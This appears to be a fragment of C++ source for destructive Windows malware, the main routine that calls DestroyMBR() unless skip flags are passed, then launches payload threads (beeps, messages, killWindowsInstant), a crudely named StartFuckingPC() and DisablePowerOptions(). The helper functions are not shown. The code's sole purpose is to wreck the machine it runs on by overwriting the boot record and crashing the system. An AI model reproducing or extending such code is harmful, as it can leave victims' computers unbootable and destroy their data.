    if (not(argc > 1 
        && !lstrcmpW(argv[1], L"skipdestroymbr")
        || !lstrcmpW(argv[1], L"nomainpayload")
        )) DestroyMBR();

    CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
    CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
    Sleep(200);
    CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

    Sleep(992);

    StartFuckingPC();
    DisablePowerOptions();
}